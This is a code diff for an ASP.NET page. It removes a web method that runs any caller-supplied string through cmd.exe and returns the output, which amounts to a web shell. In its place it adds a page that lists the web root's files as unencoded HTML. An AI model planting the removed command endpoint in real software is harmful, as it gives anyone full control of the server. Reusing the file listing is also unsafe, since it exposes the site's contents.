@@ -1,36 +1,24 @@
 using System;
-using System.Diagnostics;
-using System.Web.Services;
+using System.IO;
 
 namespace YourNamespace
 {
-    public partial class CommandConsole : System.Web.UI.Page
+    public partial class ListFiles : System.Web.UI.Page
     {
-        protected void Page_Load(object sender, EventArgs e) { }
-
-        [WebMethod]
-        public static string RunCommand(string cmd)
+        protected void Page_Load(object sender, EventArgs e)
         {
-            try
-            {
-                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
-                psi.RedirectStandardOutput = true;
-                psi.RedirectStandardError = true;
-                psi.UseShellExecute = false;
-                psi.CreateNoWindow = true;
+            string directoryPath = Server.MapPath("~/"); // root of the web app
+            string[] files = Directory.GetFiles(directoryPath);
 
-                using (Process process = Process.Start(psi))
-                {
-                    string output = process.StandardOutput.ReadToEnd();
-                    string error = process.StandardError.ReadToEnd();
-                    process.WaitForExit();
-                    return output + error;
-                }
-            }
-            catch (Exception ex)
+            string html = "<ul>";
+            foreach (string filePath in files)
             {
-                return "Exception: " + ex.Message;
+                string fileName = Path.GetFileName(filePath);
+                html += $"<li>{fileName}</li>";
             }
+            html += "</ul>";
+
+            LiteralFiles.Text = html;
         }
     }
 }
